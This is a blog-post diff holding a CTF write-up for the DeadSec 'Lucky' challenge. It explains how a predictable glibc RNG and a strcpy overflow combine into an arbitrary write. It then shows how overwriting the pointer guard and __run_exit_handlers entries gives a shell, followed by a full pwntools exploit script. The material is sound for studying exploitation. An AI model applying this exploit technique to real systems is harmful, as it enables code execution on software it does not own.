@@ -1,0 +1,709 @@
+---
+layout: posts
+title:  "Deadsec - Lucky"
+subtitle: Lucky - 4 solves
+date:   2025-07-28 02:00:00 +0200
+---
+*Exploiting __run_exit_handlers and "lucky" offsets*
+
+
+
+> What is your wish?
+
+
+## Challenge Overview 
+The challenge is a x86_64 binary in ELF format. The binary is stripped, but really small, so we don't need to reverse that much other than understanding the program. The binary is very simple guessing game for numbers with only four functionalities - guess number, check numbers, get sample number and exit. The goal is to obtain shell/arbitrary code execution to get the flag.
+
+While analyzing code we see that the random module is initialized from state read from `/dev/urandom` which is usually safe. 
+
+```c
+int init_state[2];
+void setup(void)
+{
+   ...
+   __fd = open("/dev/urandom",0);
+   ...
+   sVar1 = read(__fd,&rand_buffer,4);
+   ...
+   rand();
+   init_state[0] = 0;
+   init_state[1] = _rand_buffer;
+   setstate((char *)init_state);
+}
+```
+Note: in recent versions of glibc rand() is just wrapper for random()
+
+However by examining libc source we see `random()` invokes `__random_r()` which determines randomization based on rand_type in its internal structure.
+
+```c
+__random_r (struct random_data *buf, int32_t *result)
+{
+  ...
+  state = buf->state;
+  if (buf->rand_type == TYPE_0)
+    {
+      int32_t val = ((state[0] * 1103515245U) + 12345U) & 0x7fffffff;
+      state[0] = val;
+      *result = val;
+    }
+  else
+    {
+      ...
+    }
+  ...
+  return 0;
+}
+```
+
+This internal structure is being set using `__init_state` function, therefore the binary will use TYPE_0 randomization as the first 4 bytes are zeroed out. 
+This is amazing because we can predict numbers based on just one value, which we can get using program's get lucky number functionality. 
+
+While examining other functions one thing stands out as the strcpy is very weird way to copy data into to buffer.
+```c
+void read_into_addr_len(char *addr,ulong len)
+{
+  int i;
+  if (len < 0x21) {
+    for (i = 0; (ulong)(long)i < len; i = i + 1) {
+      buf32[i] = '\0';
+    }
+    read(0,buf32,len);
+    strcpy(addr,buf32);
+  }
+  return;
+}
+```
+
+There are two functions invoking this `read_into_addr_len` with stack address and len = 8 and 16 respectively. Even though the functions invoking this are relatively safe from any overflows. Chaining both of them will result in overflow. 
+
+When we guess the correct number we get a chance to write a "Comment", note this comment isn't used anywhere in the program.
+```c
+void check_number(void)
+{
+   char comment [24];
+   uint number;
+   int i;
+   
+   number = rand();
+   i = 0;
+   while( true ) {
+      if (0x1ff < i) {
+         puts("That\'s too bad :(\n");
+         return;
+      }
+      if (*(ulong *)(mmap_array + (long)i * 8) == (ulong)number) break;
+      i = i + 1;
+   }
+   puts("Congratulation.\nYou are super rich now!\n");
+   puts("Any comment please : ");
+   read_into_addr_len(comment,0x10);
+   return;
+}
+```
+
+The other function is the guess number which allows us to enter number which will be stored to mmaped array of our guesses.
+```c
+
+void guess_number(void)
+{
+   int idx2;
+   char number [8];
+   long idx;
+   uint i;
+   
+   number[0] = '\0';
+   number[1] = '\0';
+   number[2] = '\0';
+   number[3] = '\0';
+   number[4] = '\0';
+   number[5] = '\0';
+   number[6] = '\0';
+   number[7] = '\0';
+   puts("Lottery index : ");
+   idx2 = get_idx();
+   idx = (long)idx2;
+   if ((idx < 0) || (0x1ff < idx)) {
+      puts("Bad index :(\n");
+   }
+   else {
+      puts("Lottery number : ");
+      read_into_addr_len(number,8);
+      for (i = 0; i < 8; i = i + 1) {
+         if (number[(int)i] == '\n') {
+            number[(int)i] = '\0';
+         }
+      }
+      strcpy((char *)(idx * 8 + mmap_array),number);
+   }
+   return;
+}
+```
+
+We can chain these to functions to achieve overflow on number char array in `guess_number` function.
+To achieve this we must do following:
+1. guess the correct next number
+2. call check_number function and win
+3. write comment with length > 8
+4. call guess_number with 8 digit number and overwrite idx with the comment[8:] data
+
+`guess_number` will only zero out the initial 8 bytes however by filling them out with our input the strcpy will copy out spare data left out in our comment. This allows us to overwrite idx which is used later in strcpy, thus achieving arbitrary write primitive from mmaped_region.
+
+## Exploitation
+
+The arbitrary write primitive is powerful. We can write an string 8 byte value of our choice + index to any location calculated as mmap_array + idx * 8. Since idx is a signed long that we control, we can write to addresses both before and after our mmap_array, giving us a true arbitrary write-what-where primitive.
+
+#### The Target: __run_exit_handlers and the initial struct
+
+When a program exits cleanly (via exit() or returning from main), glibc calls the __run_exit_handlers function. This function is responsible for calling functions registered with atexit and on_exit, among other cleanup tasks. These handlers are stored in a linked list of exit_function_list structures, with the first, statically allocated list being the initial struct located in libc's .bss section.
+
+An `exit_function` entry within this structure looks something like this:
+
+```c
+struct exit_function {
+  long int flavor;
+  union {
+    void (*at) (void);
+    struct {
+      void (*fn) (int status, void *arg);
+      void *arg;
+    } on;
+    struct {
+      void (*fn) (void *arg, int status);
+      void *arg;
+      void *dso_handle;
+    } cxa;
+  } func;
+};
+```
+
+This is an ideal target. By overwriting an entry in the `initial.fns` array, we can:
+1.  Set the `flavor` to `ef_cxa` (value 4) or `ef_on` (value 2).
+2.  Overwrite `func.cxa.fn` with a pointer to `system`.
+3.  Overwrite `func.cxa.arg` with a pointer to the string `"/bin/sh"`.
+
+### Bypassing Pointer Guarding
+
+These function pointers are protected by `glibc`'s pointer guarding mechanism. The `fn` pointer is mangled before being stored:
+
+`stored_ptr = ROR(actual_ptr, 0x11) ^ pointer_guard;`
+
+And before being called, it is de-mangled:
+
+`actual_ptr = ROL(stored_ptr ^ pointer_guard, 0x11);`
+
+The `pointer_guard` is a random 64-bit value stored in Thread-Local Storage (TLS) at the offset `fs:0x30`. To successfully hijack control flow, we must know or control this guard. 
+The thread local storage is usually stored right before libc.
+
+### The "Lucky" Offset
+
+The primary obstacle is ASLR, which randomizes the base addresses of `libc`, the stack, the heap, `ld.so`, and the `fs` segment. Without a leak, we don't know the absolute addresses of our targets: the `pointer_guard` at `fs:0x30` and the `initial` struct in libc's `.bss`.
+
+The mmaped region is allocated in space between libc and ld right before ld. 
+
+Given fsbase is allocated before libc we need to guess this offset.
+
+
+### The Attack Plan
+
+My solutions requires two stages:
+1. leaking libc
+2. getting shell
+
+Originally I tried leaking libc using `puts@plt(puts@got)` and returning back to main. However I wasn't able to return anywhere else than to `_start`. I tried exploiting it this way, but returning to start would also create second mmap and different offset, which I did not have any idea how big was on remote.
+
+Given we exit_fncs array is 32 big, we can chain leak with calls to check_number and guess_number to write system address.
+
+
+##### Handling Null Bytes 
+Since our write primitive is strcpy, we cannot write null bytes. However the handler replaces all newline characters with null bytes before our Write-At-Index. Therefore we can still utilize our write primitive while slowly overwriting bytes with null bytes one by one. 
+
+#### Stage 1: Overwrite Pointer Guard and Prepare the Chain
+
+- Bruteforce `libc-ld` offset.
+
+- Overwrite Pointer Guard at `fs:0x30` with a known value (e.g., `0x7f7f7f7f7f7f7f7f`)
+ 
+-  The `__run_exit_handlers` function processes the fns array in reverse, starting from the highest index and counting down (--cur->idx).  Therefore our fnc array should look like this
+
+```
+function count
+spot_for_system("/bin/sh")
+guess_number <- /bin/sh write for rdi
+check_number
+guess_number <- null byte write for rdi
+check_number
+guess_number <- system write
+check_number 
+puts@plt(puts@got)
+```
+
+
+#### Stage 2: The Self-Modifying Exit Handler Chain
+After setting up exit fncs array we call exit to start execution and write `system` with `/bin/sh` as an argument to our predefined spot.
+
+### Azure 
+There was an alarm set up for 60 seconds, so our exploit had to run in that time. The problem was we were not getting our responses fast enough from the server. For that reason we spun up azure vps close to their server and in about an hour we got the flag.
+
+
+## script
+```py
+#!/usr/bin/env python3
+
+from pwn import *
+from ctypes import CDLL
+import time
+import subprocess
+import json
+
+glibc = CDLL("./libc.so.6")
+
+
+e = ELF("./prob_patched")
+libc = ELF("./libc.so.6")
+ld = ELF("./ld-linux-x86-64.so.2")
+
+
+context.binary = e
+context.terminal = ["tmux", "splitw", "-v"]
+GDB = f"""
+set follow-fork-mode parent
+#b *0x004015aa
+#set *(long *)rand = 0xc3c031
+
+#b *0x401640
+b *__run_exit_handlers+229
+c"""
+
+
+def conn():
+    if args.LOCAL:
+        r = process([e.path], aslr=False)
+        if args.GDB:
+            gdb.attach(r, gdbscript=GDB)
+    else:
+        # r = remote("nc.deadsec.quest", 32370)
+        r = remote("localhost", 15252)
+    return r
+
+
+# abbreviations
+cst = constants
+shc = shellcraft
+
+# logging
+linfo = lambda x, *a: log.info(x, *a)
+lwarn = lambda x, *a: log.warn(x, *a)
+lerr = lambda x, *a: log.error(x, *a)
+lprog = lambda x, *a: log.progress(x, *a)
+lhex = lambda x, y="leak": linfo("%#018x <- %s" % (x, y))
+phex = lambda x, y="leak": print("%#018x <- %s" % (x, y))
+
+
+# type manipulation
+byt = lambda x: x if isinstance(x, (bytes, bytearray)) else str(x).encode()
+rpad = lambda x, s=8, v=b"\0": x.ljust(s, v)
+lpad = lambda x, s=8, v=b"\0": x.rjust(s, v)
+hpad = lambda x, s=0: "%0*x" % ((s if s else ((x.bit_length() // 8) + 1) * 2), x)
+upad = lambda x: u64(rpad(x))
+cpad = lambda x, s: byt(x) + cyc(s)[len(byt(x)) :]
+tob = lambda x: bytes.fromhex(hpad(x))
+
+# elf aliases
+gelf = lambda elf=None: elf if elf else exe
+srh = lambda x, elf=None: gelf(elf).search(byt(x)).__next__()
+sasm = lambda x, elf=None: gelf(elf).search(asm(x), executable=True).__next__()
+lsrh = lambda x: srh(x, libc)
+lasm = lambda x: sasm(x, libc)
+
+# cyclic aliases
+cyc = lambda x: cyclic(x)
+cfd = lambda x: cyclic_find(x)
+cto = lambda x: cyc(cfd(x))
+
+# tube aliases
+t = None
+gt = lambda at=None: at if at else t
+sl = lambda x, t=None, *a, **kw: gt(t).sendline(byt(x), *a, **kw)
+se = lambda x, t=None, *a, **kw: gt(t).send(byt(x), *a, **kw)
+ss = lambda x, s, t=None, *a, **kw: (
+    sl(x, t, *a, **kw)
+    if len(x) < s
+    else se(x, *a, **kw) if len(x) == s else lerr("ss to big: %#x > %#x" % (len(x), s))
+)
+sla = lambda x, y, t=None, *a, **kw: gt(t).sendlineafter(byt(x), byt(y), *a, **kw)
+sa = lambda x, y, t=None, *a, **kw: gt(t).sendafter(byt(x), byt(y), *a, **kw)
+sas = lambda x, y, s, t=None, *a, **kw: (
+    sla(x, y, t, *a, **kw)
+    if len(y) < s
+    else (
+        sa(x, y, *a, **kw)
+        if len(y) == s
+        else lerr("ss to big: %#x > %#x" % (len(x), s))
+    )
+)
+ra = lambda t=None, *a, **kw: gt(t).recvall(*a, **kw)
+rl = lambda t=None, *a, **kw: gt(t).recvline(*a, **kw)
+rls = lambda t=None, *a, **kw: rl(t=t, *a, **kw)[:-1]
+rcv = lambda x, t=None, *a, **kw: gt(t).recv(x, *a, **kw)
+ru = lambda x, t=None, *a, **kw: gt(t).recvuntil(byt(x), *a, **kw)
+it = lambda t=None, *a, **kw: gt(t).interactive(*a, **kw)
+cl = lambda t=None, *a, **kw: gt(t).close(*a, **kw)
+
+WRITE = 1
+DRAW = 2
+GET = 3
+EXIT = 4
+
+
+def menu(idx):
+    sla(">", idx)
+
+
+# good luck pwning :)
+def write_lot(idx, num):
+    if type(num) == int:
+        num = str(num).encode()
+    menu(WRITE)
+    if len(str(idx)) < 2:
+
+        se(str(idx))
+    else:
+        se(idx)
+    # print(len(num), num)
+    if len(num) < 8:
+        sa("number :", num.ljust(8, b"\x00"))
+        sa("number :", num)
+    else:
+        num.ljust(8, b"\x00")
+        assert len(num) == 8, "Number must be exactly 8 bytes long"
+        sa("number :", num)
+
+    # print("Wrote lot at index", idx, "with number", num)
+
+
+def draw_lot(com=""):
+    global LAST_VALUE
+    menu(DRAW)
+    if b"Congratulation" in rls():
+        if len(com) < 8:
+            com = com.ljust(8, b"\x00")
+        sa("please :", com)
+    else:
+        print(find_rng_seed(LAST_VALUE))
+        LAST_VALUE = find_rng_seed(LAST_VALUE)
+        print(get_lucky())
+        print(find_rng_seed(LAST_VALUE))
+        LAST_VALUE = find_rng_seed(LAST_VALUE)
+        print(get_lucky())
+        print("Failed to draw lot")
+        raise EOFError("Failed to draw lot, maybe wrong input?")
+
+
+def get_lucky():
+    menu(GET)
+    ru("lucky number is ")
+    lucky = int(rls())
+    return lucky
+
+
+def win_lot(idx=1):
+    global LAST_VALUE
+
+    real_aa = find_rng_seed(LAST_VALUE)
+    LAST_VALUE = real_aa
+    aa = p64(real_aa).rstrip(b"\x00")
+    # print(aa)
+    if b"\x0a" in aa or b"\x00" in aa:
+        print("Invalid number, contains newline character")
+        LAST_VALUE = get_lucky()
+        win_lot(idx=idx)
+        return
+
+    write_lot(idx, p64(real_aa))
+
+
+def find_rng_seed(value):
+    return ((value * 1103515245) + 12345) & 0x7FFFFFFF
+
+
+rol = lambda val, r_bits, max_bits: (val << r_bits % max_bits) & (2**max_bits - 1) | (
+    (val & (2**max_bits - 1)) >> (max_bits - (r_bits % max_bits))
+)
+
+
+LIBC_BASE = 0x79934B380000
+INITIAL = LIBC_BASE + 0x21BF00
+FS_BASE = 0x15555550F000 + 0x740
+FS_BASE = 0x79934B37D000 + 0x740
+
+off = 0x2000
+tries = 0
+LAST_VALUE = 0
+tries = 0
+while True:
+    try:
+
+        MMAP_BASE = 0x155555551000 + off
+        MMAP_BASE = 0x79934B5E5000 + off
+        t = conn()
+        start_time = time.time()
+        val1 = get_lucky()
+        print(hex(MMAP_BASE - FS_BASE + 0x740))
+        print(hex(MMAP_BASE - LIBC_BASE))
+
+        LAST_VALUE = val1
+
+        key = 0x7F7F7F7F7F7F7F7F
+        print("prepisujeme fs_base")
+
+        OFFSET = ((FS_BASE + 0x30 - MMAP_BASE) & 0xFFFFFFFFFFFFFFFF) // 8
+        print(f"OFFSET: {OFFSET:#x}")
+
+        payload = p64(0xFFFFFFFFFFFFFFFF) + p64(OFFSET)
+        win_lot()
+        draw_lot(com=payload)
+        write_lot(0, p64(key))
+
+        for i in range(0, 1):
+            print("Exploit started, writing exit function list and type...", i)
+            MMAP_BASE += off * i
+            OFFSET = ((INITIAL - MMAP_BASE) & 0xFFFFFFFFFFFFFFFF) // 8
+            print(f"OFFSET: {OFFSET:#x}")
+            # write initial fncs cnt
+            print("zaciname")
+            for i in range(1, 8):
+                n_fncs = 9
+                data = p64(n_fncs)
+                data = data.replace(b"\x00", b"\x41")
+                data = data[:-i] + b"\n" + b"A" * (i - 1)
+                print(data)
+                payload = p64(0xFFFFFFFFFFFFFFFF) + p64(OFFSET + 1)
+                win_lot()
+                draw_lot(com=payload)
+                write_lot(0, data)
+            # write exit function->type
+            for i in range(1, 8):
+                fnc_type = 4
+                data = p64(fnc_type)
+                data = data.replace(b"\x00", b"\x41")
+                data = data[:-i] + b"\n" + b"A" * (i - 1)
+                print(data)
+                payload = p64(0xFFFFFFFFFFFFFFFF) + p64(OFFSET + 2)
+
+                win_lot()
+                draw_lot(com=payload)
+                write_lot(0, data)
+            # posledny win
+            # sem sa napise
+
+            # write exit function->type
+            for i in range(1, 8):
+                fnc_type = 4
+                data = p64(fnc_type)
+                data = data.replace(b"\x00", b"\x41")
+                data = data[:-i] + b"\n" + b"A" * (i - 1)
+                print(data)
+                payload = p64(0xFFFFFFFFFFFFFFFF) + p64(OFFSET + 6)
+                win_lot()
+                draw_lot(com=payload)
+                write_lot(0, data)
+
+            # call do guess_number() invoke overflow
+            print("vyhravame")
+            guess_number = 0x4015AA  # create
+            payload = p64(0xFFFFFFFFFFFFFFFF) + p64(OFFSET + 7)
+            win_lot()
+            draw_lot(com=payload)
+            write_lot(0, p64(rol((guess_number ^ key), 0x11, 64)))
+
+            # write exit function->type
+            for i in range(1, 8):
+                fnc_type = 4
+                data = p64(fnc_type)
+                data = data.replace(b"\x00", b"\x41")
+                data = data[:-i] + b"\n" + b"A" * (i - 1)
+                print(data)
+                payload = p64(0xFFFFFFFFFFFFFFFF) + p64(OFFSET + 10)
+                win_lot()
+                draw_lot(com=payload)
+                write_lot(0, data)
+
+            # call do check_number()
+            check = 0x40165C  # check
+            payload = p64(0xFFFFFFFFFFFFFFFF) + p64(OFFSET + 11)
+            win_lot()
+            draw_lot(com=payload)
+            write_lot(0, p64(rol((check ^ key), 0x11, 64)))
+
+            # write exit function->type
+            for i in range(1, 8):
+                fnc_type = 4
+                data = p64(fnc_type)
+                data = data.replace(b"\x00", b"\x41")
+                data = data[:-i] + b"\n" + b"A" * (i - 1)
+                print(data)
+                payload = p64(0xFFFFFFFFFFFFFFFF) + p64(OFFSET + 14)
+                win_lot()
+                draw_lot(com=payload)
+                write_lot(0, data)
+
+            # call do guess_number()
+            print("vyhravame")
+            guess_number = 0x4015AA
+            payload = p64(0xFFFFFFFFFFFFFFFF) + p64(OFFSET + 15)
+            win_lot()
+            draw_lot(com=payload)
+            write_lot(0, p64(rol((guess_number ^ key), 0x11, 64)))
+
+            # write exit function->type
+            for i in range(1, 8):
+                fnc_type = 4
+                data = p64(fnc_type)
+                data = data.replace(b"\x00", b"\x41")
+                data = data[:-i] + b"\n" + b"A" * (i - 1)
+                print(data)
+                payload = p64(0xFFFFFFFFFFFFFFFF) + p64(OFFSET + 18)
+                win_lot()
+                draw_lot(com=payload)
+                write_lot(0, data)
+
+            # call do check_number
+            check_number = 0x40165C
+            payload = p64(0xFFFFFFFFFFFFFFFF) + p64(OFFSET + 19)
+            win_lot()
+            draw_lot(com=payload)
+            write_lot(0, p64(rol((check_number ^ key), 0x11, 64)))
+
+            # write exit function->type
+            for i in range(1, 8):
+                puts_got = 4
+                data = p64(puts_got)
+                data = data.replace(b"\x00", b"\x41")
+                data = data[:-i] + b"\n" + b"A" * (i - 1)
+                print(data)
+                payload = p64(0xFFFFFFFFFFFFFFFF) + p64(OFFSET + 22)
+                win_lot()
+                draw_lot(com=payload)
+                write_lot(0, data)
+
+            # call do guess_number() overflow
+            guess_number = 0x4015AA
+            payload = p64(0xFFFFFFFFFFFFFFFF) + p64(OFFSET + 23)
+            win_lot()
+            draw_lot(com=payload)
+            write_lot(0, p64(rol((guess_number ^ key), 0x11, 64)))
+
+            #
+            # write exit function->type
+            for i in range(1, 8):
+                fnc_type = 4
+                data = p64(fnc_type)
+                data = data.replace(b"\x00", b"\x41")
+                data = data[:-i] + b"\n" + b"A" * (i - 1)
+                print(data)
+                payload = p64(0xFFFFFFFFFFFFFFFF) + p64(OFFSET + 26)
+                win_lot()
+                draw_lot(com=payload)
+                write_lot(0, data)
+
+            # call do check_number
+            check_number = 0x40165C
+            payload = p64(0xFFFFFFFFFFFFFFFF) + p64(OFFSET + 27)
+            win_lot()
+            draw_lot(com=payload)
+            write_lot(0, p64(rol((check_number ^ key), 0x11, 64)))
+
+            ## leak libc usign puts@plt(puts@got)
+
+            # write exit function->type
+            for i in range(1, 8):
+                fnc_type = 4
+                data = p64(fnc_type)
+                data = data.replace(b"\x00", b"\x41")
+                data = data[:-i] + b"\n" + b"A" * (i - 1)
+                print(data)
+                payload = p64(0xFFFFFFFFFFFFFFFF) + p64(OFFSET + 34)
+                print("[!!!!!!]", payload)
+                win_lot()
+                draw_lot(com=payload)
+                write_lot(0, data)
+
+            # leak libc
+            puts_plt = 0x40135B
+            payload = p64(0xFFFFFFFFFFFFFFFF) + p64(OFFSET + 35)
+            win_lot()
+            draw_lot(com=payload)
+            write_lot(0, p64(rol((puts_plt ^ key), 0x11, 64)))
+
+            for i in range(1, 6):
+
+                puts_got = 0x403FA0
+                data = p64(puts_got)
+                data = data.replace(b"\x00", b"\x41")
+                data = data[:-i] + b"\n" + b"A" * (i - 1)
+                print(data)
+                payload = p64(0xFFFFFFFFFFFFFFFF) + p64(OFFSET + 36)
+                win_lot()
+                draw_lot(com=payload)
+                write_lot(0, data)
+
+        print("exitujeme")
+        win_lot(2)
+        win_lot(3)
+        win_lot(4)
+        win_lot(5)
+        win_lot(6)
+        sl(4)
+        ru(b"bye~\n")
+        leak = upad(rcv(6))
+        lhex(leak, "leak")
+        libc.address = leak - 0x19ECB0
+
+        payload = p64(0xFFFFFFFFFFFFFFFF) + p64(OFFSET + 3)
+        sa("please : ", payload)
+
+        sla("index : ", "0")
+        sa("number : ", p64(rol(libc.sym["system"] ^ key, 0x11, 64)))
+
+        payload = p64(0xFFFFFFFFFFFFFFFF) + p64(OFFSET + 4)
+        sa("please : ", payload)
+
+        sla("index : ", "0")
+        puts_got = next(libc.search(b"/bin/sh"))
+        data = p64(puts_got)
+        data = data.replace(b"\x00", b"\x41")
+        data = data[:-1] + b"\n"
+
+        sa("number : ", data)
+        payload = p64(0xFFFFFFFFFFFFFFFF) + p64(OFFSET + 4)
+        sa("please : ", payload)
+
+        sla("index : ", "0")
+        puts_got = next(libc.search(b"/bin/sh"))
+        data = p64(puts_got)
+        data = data.replace(b"\x00", b"\x41")
+        data = data[:-2] + b"\n" + b"A"
+        sa("number : ", data)
+        print("!!!!!!!!!!!!VYHRALI SME PRVU CAST")
+
+        sl("cat flag.txt")
+        sl("cat /home/prob/flag.txt")
+        sl("cat /flag.txt")
+        sl("cat /flag")
+        print(ra(timeout=1))
+        break
+    except EOFError as ea:
+        print("jetopici")
+        end_time = time.time()
+        elapsed_time = end_time - start_time
+        print(f"Elapsed time: {elapsed_time:.2f} seconds")
+        print("EOFError:", ea)
+        t.close()
+        continue
+
+    except Exception as ea:
+        print("Error:", ea)
+        t.close()
+        continue
+
+```
